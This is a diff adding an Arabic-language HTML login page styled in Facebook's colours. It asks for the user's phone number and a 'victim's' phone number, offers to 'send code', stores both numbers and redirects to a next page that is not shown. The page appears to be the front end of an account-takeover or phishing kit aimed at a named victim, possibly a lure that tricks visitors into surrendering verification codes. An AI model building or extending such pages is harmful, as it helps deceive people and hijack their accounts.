@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #4267B2, #29487d);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      direction: rtl;
+    }
+
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #4267B2;
+      margin-bottom: 25px;
+      font-weight: 800;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 10px;
+      border: 1.5px solid #ccc;
+      font-size: 16px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 17px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #145dbf;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>تسجيل الدخول</h2>
+    <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>
+    <input type="tel" id="victimPhone" placeholder="رقم هاتف الضحية" required>
+    <button onclick="goToCode()">أرسل كود</button>
+  </div>
+
+  <script>
+    function goToCode() {
+      const myPhone = document.getElementById('myPhone').value.trim();
+      const victimPhone = document.getElementById('victimPhone').value.trim();
+
+      if (!/^[0-9]{10,15}$/.test(myPhone) || !/^[0-9]{10,15}$/.test(victimPhone)) {
+        alert("يرجى إدخال أرقام صحيحة (10 إلى 15 رقمًا).");
+        return;
+      }
+
+      // حفظ البيانات مؤقتًا
+      localStorage.setItem("myPhone", myPhone);
+      localStorage.setItem("victimPhone", victimPhone);
+
+      // الذهاب للصفحة التالية
+      window.location.href = "next.html";
+    }
+  </script>
+</body>
+</html>
